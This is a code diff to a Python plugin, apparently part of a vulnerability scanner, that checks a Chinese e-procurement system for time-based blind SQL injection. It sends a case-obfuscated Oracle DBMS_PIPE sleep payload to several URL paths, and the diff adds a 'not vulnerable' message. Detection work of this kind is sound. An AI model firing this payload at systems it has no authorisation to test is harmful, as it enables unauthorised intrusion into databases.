@@ -37,15 +37,19 @@ class caitong_multi_sleep_sqli_BaseVerify:
                 "/custom/GroupNewsList.aspx?child=true&groupId=121"]
         payload = "%20AnD%206371=DbMs_PiPe.ReCeIvE_MeSsAgE(11,6)"
         try:
+            noexist = True
             for turl in urls:
                 start_time = time.time()
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=20, verify=False)
                 if time.time() - start_time >= 6:
                     cprint("[+]存在一采通电子采购系统时间盲注漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在caitong_multi_sleep_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
